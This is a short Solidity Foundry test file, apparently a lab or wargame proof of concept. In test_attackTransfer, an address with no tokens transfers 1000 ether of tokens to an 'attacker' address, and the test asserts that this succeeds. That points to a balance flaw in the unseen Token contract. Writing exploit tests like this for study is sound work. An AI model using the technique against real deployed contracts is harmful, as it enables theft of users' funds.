// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";

contract TestToken is Test {
    Token public token;
    address attacker = makeAddr('NewOwner');
    address Owner = makeAddr('Owner');
    address attackersAddress = makeAddr('Attacker');


    function setUp() public {
        vm.prank(Owner);
        token = new Token(1000 ether);


    }
    function test_attackTransfer() public {
        vm.prank(attacker);
        token.transfer(attackersAddress, 1000 ether);
        console.log(token.balanceOf(attacker));
        assertEq(token.balanceOf(attackersAddress), 1000 ether);
    }
}